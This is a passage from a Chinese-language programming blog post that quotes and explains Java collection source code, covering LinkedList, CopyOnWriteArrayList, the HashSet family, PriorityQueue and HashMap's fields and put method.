class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Links e as first element.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">linkFirst</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; f = first;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; newNode = <span class="keyword">new</span> Node&lt;&gt;(<span class="keyword">null</span>, e, f);</span><br><span class="line">    first = newNode;</span><br><span class="line">    <span class="keyword">if</span> (f == <span class="keyword">null</span>)</span><br><span class="line">        last = newNode;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        f.prev = newNode;</span><br><span class="line">    size++;</span><br><span class="line">    modCount++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Links e as last element.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">linkLast</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; l = last;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; newNode = <span class="keyword">new</span> Node&lt;&gt;(l, e, <span class="keyword">null</span>);</span><br><span class="line">    last = newNode;</span><br><span class="line">    <span class="keyword">if</span> (l == <span class="keyword">null</span>)</span><br><span class="line">        first = newNode;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        l.next = newNode;</span><br><span class="line">    size++;</span><br><span class="line">    modCount++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Inserts element e before non-null Node succ.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">linkBefore</span><span class="params">(E e, Node&lt;E&gt; succ)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// assert succ != null;</span></span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; pred = succ.prev;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; newNode = <span class="keyword">new</span> Node&lt;&gt;(pred, e, succ);</span><br><span class="line">    succ.prev = newNode;</span><br><span class="line">    <span class="keyword">if</span> (pred == <span class="keyword">null</span>)</span><br><span class="line">        first = newNode;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        pred.next = newNode;</span><br><span class="line">    size++;</span><br><span class="line">    modCount++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Unlinks non-null first node f.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> E <span class="title">unlinkFirst</span><span class="params">(Node&lt;E&gt; f)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// assert f == first &amp;&amp; f != null;</span></span><br><span class="line">    <span class="keyword">final</span> E element = f.item;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; next = f.next;</span><br><span class="line">    f.item = <span class="keyword">null</span>;</span><br><span class="line">    f.next = <span class="keyword">null</span>; <span class="comment">// help GC</span></span><br><span class="line">    first = next;</span><br><span class="line">    <span class="keyword">if</span> (next == <span class="keyword">null</span>)</span><br><span class="line">        last = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        next.prev = <span class="keyword">null</span>;</span><br><span class="line">    size--;</span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="keyword">return</span> element;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Unlinks non-null last node l.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> E <span class="title">unlinkLast</span><span class="params">(Node&lt;E&gt; l)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// assert l == last &amp;&amp; l != null;</span></span><br><span class="line">    <span class="keyword">final</span> E element = l.item;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; prev = l.prev;</span><br><span class="line">    l.item = <span class="keyword">null</span>;</span><br><span class="line">    l.prev = <span class="keyword">null</span>; <span class="comment">// help GC</span></span><br><span class="line">    last = prev;</span><br><span class="line">    <span class="keyword">if</span> (prev == <span class="keyword">null</span>)</span><br><span class="line">        first = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        prev.next = <span class="keyword">null</span>;</span><br><span class="line">    size--;</span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="keyword">return</span> element;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Unlinks non-null node x.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">E <span class="title">unlink</span><span class="params">(Node&lt;E&gt; x)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// assert x != null;</span></span><br><span class="line">    <span class="keyword">final</span> E element = x.item;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; next = x.next;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; prev = x.prev;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prev == <span class="keyword">null</span>) &#123;</span><br><span class="line">        first = next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        prev.next = next;</span><br><span class="line">        x.prev = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (next == <span class="keyword">null</span>) &#123;</span><br><span class="line">        last = prev;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        next.prev = prev;</span><br><span class="line">        x.next = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    x.item = <span class="keyword">null</span>;</span><br><span class="line">    size--;</span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="keyword">return</span> element;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查找操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">      checkElementIndex(index);</span><br><span class="line">      <span class="keyword">return</span> node(index).item;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Node&lt;E&gt; <span class="title">node</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 当index在前半边，从前往后找，当index在后半边，从后往前找。</span></span><br><span class="line">      <span class="keyword">if</span> (index &lt; (size &gt;&gt; <span class="number">1</span>)) &#123;</span><br><span class="line">          Node&lt;E&gt; x = first;</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index; i++)</span><br><span class="line">              x = x.next;</span><br><span class="line">          <span class="keyword">return</span> x;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          Node&lt;E&gt; x = last;</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">int</span> i = size - <span class="number">1</span>; i &gt; index; i--)</span><br><span class="line">              x = x.prev;</span><br><span class="line">          <span class="keyword">return</span> x;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>LinkedList是使用双向链表实现，故不存在扩容的说法。</p><p>插入：LinkedList提供了linkFirst、linkLast、linkBefore三种插入操作方便，当顺序插入时时间复杂度为O(1)，直接用linkFirst或者linkLast；当在中间固定位置进行插入时候需要先用node(index)定位到具体位置然后使用linkBefore进行插入，查找的时间复杂度为O(n)。</p><p>查找：因为LinkedList的链表实现，当查找第一个或者最后一个的时候，由于LinkedList里面有记录first和last的node，所以时间复杂度为O(1)，查找中间的时候会根据当前index在链表的前半位置（从first向后查找）还是后半位置（从last向前查找）来进行查找，时间复杂度为O(n)。</p><p>ArrayList和LinkedList比较</p><p>查询比较多：1、查找的是第一个或者最后一个的时候，ArrayList和LinkedList一样都是O(1)；2、查找中间元素的时候，ArrayList时间复杂度O(1)，LinkedList时间复杂度O(n)，选ArrayList。</p><p>插入比较多：1、顺序插入，LinkedList时间复杂度O(1)，ArrayList时间复杂度O(1)但是长度不够会进行扩容；2、其他位置插入的时候，LinkedList时间复杂度O(n)，ArrayList会进行数组的copy以及长度不够会进行扩容。</p><h4 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h4><p>vector基本是对ArrayList的操作加了synchronized关键字，所以是线程安全的。</p><h4 id="CopyOnWriteArrayList"><a href="#CopyOnWriteArrayList" class="headerlink" title="CopyOnWriteArrayList"></a>CopyOnWriteArrayList</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">transient</span> Object lock = <span class="keyword">new</span> Object(); <span class="comment">// 用来作为锁的对象</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">volatile</span> Object[] array; <span class="comment">// 真正存数据的地方</span></span><br></pre></td></tr></table></figure><p>首先copyOnWriteArrayList会有一个final修饰的lock对象用来当做锁对象，每次进行set add等操作的时候会使用synchronized对这个lock对象进行加锁，然后copyOnWriteArrayList实现了Cloneable接口，主要为后面的clone做准备。</p><p>基本操作方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> elementAt(getArray(), index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">set</span><span class="params">(<span class="keyword">int</span> index, E element)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">synchronized</span> (lock) &#123;</span><br><span class="line">    Object[] es = getArray();</span><br><span class="line">    E oldValue = elementAt(es, index);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (oldValue != element) &#123;</span><br><span class="line">      es = es.clone();</span><br><span class="line">      es[index] = element;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Ensure volatile write semantics even when oldvalue == element</span></span><br><span class="line">    setArray(es);</span><br><span class="line">    <span class="keyword">return</span> oldValue;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">synchronized</span> (lock) &#123;</span><br><span class="line">    Object[] es = getArray();</span><br><span class="line">    <span class="keyword">int</span> len = es.length;</span><br><span class="line">    es = Arrays.copyOf(es, len + <span class="number">1</span>);</span><br><span class="line">    es[len] = e;</span><br><span class="line">    setArray(es);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E element)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">synchronized</span> (lock) &#123;</span><br><span class="line">    Object[] es = getArray();</span><br><span class="line">    <span class="keyword">int</span> len = es.length;</span><br><span class="line">    <span class="keyword">if</span> (index &gt; len || index &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> IndexOutOfBoundsException(outOfBounds(index, len));</span><br><span class="line">    Object[] newElements;</span><br><span class="line">    <span class="keyword">int</span> numMoved = len - index;</span><br><span class="line">    <span class="keyword">if</span> (numMoved == <span class="number">0</span>)</span><br><span class="line">      newElements = Arrays.copyOf(es, len + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      newElements = <span class="keyword">new</span> Object[len + <span class="number">1</span>];</span><br><span class="line">      System.arraycopy(es, <span class="number">0</span>, newElements, <span class="number">0</span>, index);</span><br><span class="line">      System.arraycopy(es, index, newElements, index + <span class="number">1</span>,</span><br><span class="line">                       numMoved);</span><br><span class="line">    &#125;</span><br><span class="line">    newElements[index] = element;</span><br><span class="line">    setArray(newElements);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">remove</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">synchronized</span> (lock) &#123;</span><br><span class="line">    Object[] es = getArray();</span><br><span class="line">    <span class="keyword">int</span> len = es.length;</span><br><span class="line">    E oldValue = elementAt(es, index);</span><br><span class="line">    <span class="keyword">int</span> numMoved = len - index - <span class="number">1</span>;</span><br><span class="line">    Object[] newElements;</span><br><span class="line">    <span class="keyword">if</span> (numMoved == <span class="number">0</span>)</span><br><span class="line">      newElements = Arrays.copyOf(es, len - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      newElements = <span class="keyword">new</span> Object[len - <span class="number">1</span>];</span><br><span class="line">      System.arraycopy(es, <span class="number">0</span>, newElements, <span class="number">0</span>, index);</span><br><span class="line">      System.arraycopy(es, index + <span class="number">1</span>, newElements, index,</span><br><span class="line">                       numMoved);</span><br><span class="line">    &#125;</span><br><span class="line">    setArray(newElements);</span><br><span class="line">    <span class="keyword">return</span> oldValue;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到get方法是不加锁的，直接从类定义的array数组里面获取值，而add set remove等方法都需要先进行加锁，然后对原先的array数组clone出来一个新的数组，对新数组进行操作，操作完成后赋值给array对象。</p><h3 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h3><h4 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> HashMap&lt;E,Object&gt; map;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Dummy value to associate with an Object in the backing Map</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Object PRESENT = <span class="keyword">new</span> Object();</span><br></pre></td></tr></table></figure><p>HashSet底层实现使用HashMap，将值存放在HashMap的key里面，value是固定的PRESENT，利用了HashMap的key不重复作用实现了HashSet，所以HashSet是无序、不重复的。</p><h4 id="LinkedHashSet"><a href="#LinkedHashSet" class="headerlink" title="LinkedHashSet"></a>LinkedHashSet</h4><p>代码里面只有四个构造器，调用父类HashSet的构造器，HashSet的实现变成LinkedHashMap，其余操作一致。</p><h4 id="TreeSet"><a href="#TreeSet" class="headerlink" title="TreeSet"></a>TreeSet</h4><p>TreeSet底层使用TreeMap。</p><h3 id="Queue"><a href="#Queue" class="headerlink" title="Queue"></a>Queue</h3><h4 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h4><p>优先级队列，内部采用数组实现平衡二叉堆，n的子节点为2n+1和2(n+1)。</p><p>几个重要的参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DEFAULT_INITIAL_CAPACITY = <span class="number">11</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Priority queue represented as a balanced binary heap: the two</span></span><br><span class="line"><span class="comment">   * children of queue[n] are queue[2*n+1] and queue[2*(n+1)].  The</span></span><br><span class="line"><span class="comment">   * priority queue is ordered by comparator, or by the elements&#x27;</span></span><br><span class="line"><span class="comment">   * natural ordering, if comparator is null: For each node n in the</span></span><br><span class="line"><span class="comment">   * heap and each descendant d of n, n &lt;= d.  The element with the</span></span><br><span class="line"><span class="comment">   * lowest value is in queue[0], assuming the queue is nonempty.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">transient</span> Object[] queue; <span class="comment">// non-private to simplify nested class access</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * The number of elements in the priority queue.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * The comparator, or null if priority queue uses elements&#x27;</span></span><br><span class="line"><span class="comment">   * natural ordering.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="meta">@SuppressWarnings(&quot;serial&quot;)</span> <span class="comment">// Conditionally serializable</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> Comparator&lt;? <span class="keyword">super</span> E&gt; comparator;</span><br></pre></td></tr></table></figure><h4 id="DelayQueue"><a href="#DelayQueue" class="headerlink" title="DelayQueue"></a>DelayQueue</h4><p>内部实现采用PriorityQueue和ReentrantLock以及Condition。</p><h2 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h2><h3 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3><p>HashMap的底层采用数组+(链表或者红黑树)来实现，jdk1.7版本和1.8版本还有区别，这里只说1.8版本。</p><p>先来一张HashMap数据结构的图</p><div class="tag-plugin image"><div class="image-bg"><img src="/2022/04/21/%E9%9B%86%E5%90%88/image-20231220172951071.png"></div></div><p>我们先看一下它定义的默认值分别是什么意思。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 默认的初始化大小为16</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DEFAULT_INITIAL_CAPACITY = <span class="number">1</span> &lt;&lt; <span class="number">4</span>; <span class="comment">// aka 16</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 最大的容量大小 1&lt;&lt;30 = 2^30</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MAXIMUM_CAPACITY = <span class="number">1</span> &lt;&lt; <span class="number">30</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认的扩容因子0.75,达到容量0.75的时候进行扩容</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">float</span> DEFAULT_LOAD_FACTOR = <span class="number">0.75f</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 链表转红黑树的长度</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> TREEIFY_THRESHOLD = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 红黑树转链表的长度</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> UNTREEIFY_THRESHOLD = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转红黑树的table数组的最小长度</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MIN_TREEIFY_CAPACITY = <span class="number">64</span>;</span><br></pre></td></tr></table></figure><p>HashMap类参数的定义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Node的存储地方</span></span><br><span class="line"><span class="keyword">transient</span> Node&lt;K,V&gt;[] table;</span><br><span class="line"><span class="comment">// 存储数据的大小</span></span><br><span class="line"><span class="keyword">transient</span> <span class="keyword">int</span> size;</span><br><span class="line"><span class="comment">// 操作的次数</span></span><br><span class="line"><span class="keyword">transient</span> <span class="keyword">int</span> modCount;</span><br><span class="line"><span class="comment">// 需要扩容容量的大小，容量*扩容因子的值。</span></span><br><span class="line"><span class="keyword">int</span> threshold;</span><br><span class="line"><span class="comment">// 扩容因子</span></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">float</span> loadFactor;</span><br></pre></td></tr></table></figure><p>Node节点的类参数定义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">Map</span>.<span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">int</span> hash;</span><br><span class="line">  <span class="keyword">final</span> K key;</span><br><span class="line">  V value;</span><br><span class="line">  Node&lt;K,V&gt; next;</span><br><span class="line"></span><br><span class="line">  Node(<span class="keyword">int</span> hash, K key, V value, Node&lt;K,V&gt; next) &#123;</span><br><span class="line">    <span class="keyword">this</span>.hash = hash;</span><br><span class="line">    <span class="keyword">this</span>.key = key;</span><br><span class="line">    <span class="keyword">this</span>.value = value;</span><br><span class="line">    <span class="keyword">this</span>.next = next;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> K <span class="title">getKey</span><span class="params">()</span>        </span>&#123; <span class="keyword">return</span> key; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> V <span class="title">getValue</span><span class="params">()</span>      </span>&#123; <span class="keyword">return</span> value; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> key + <span class="string">&quot;=&quot;</span> + value; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Objects.hashCode(key) ^ Objects.hashCode(value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> V <span class="title">setValue</span><span class="params">(V newValue)</span> </span>&#123;</span><br><span class="line">    V oldValue = value;</span><br><span class="line">    value = newValue;</span><br><span class="line">    <span class="keyword">return</span> oldValue;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="keyword">this</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> o <span class="keyword">instanceof</span> Map.Entry&lt;?, ?&gt; e</span><br><span class="line">      &amp;&amp; Objects.equals(key, e.getKey())</span><br><span class="line">      &amp;&amp; Objects.equals(value, e.getValue());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析一下其中主要的几个重要方法</p><h5 id="put方法"><a href="#put方法" class="headerlink" title="put方法"></a>put方法</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取key的hash值</span></span><br><span class="line">      <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Implements Map.put and related methods.</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> hash hash for key</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> key the 